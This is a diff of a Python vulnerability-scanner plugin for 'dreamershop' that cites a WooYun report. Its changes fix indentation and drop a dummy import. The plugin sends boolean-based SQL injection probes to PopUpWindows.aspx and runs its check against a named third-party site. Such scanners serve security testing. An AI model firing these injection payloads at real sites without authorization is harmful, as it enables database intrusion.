@@ -4,7 +4,7 @@
 # refer: http://www.wooyun.org/bugs/wooyun-2015-0121914
 def assign(service, arg):
     if service == "dreamershop":
-	return True, arg
+        return True, arg
 
 def audit(arg):
     payload = ['PopUpWindows.aspx?id=1','PopUpWindows.aspx?id=1%20and%201=1','PopUpWindows.aspx?id=1%20and%201=2']
@@ -18,5 +18,5 @@ def audit(arg):
         security_hole(url + ' :found SQL Injection')
 
 if __name__ == '__main__':
-    from dummy import *
+
     audit(assign('dreamershop', 'http://www.fujian17.com/')[1])
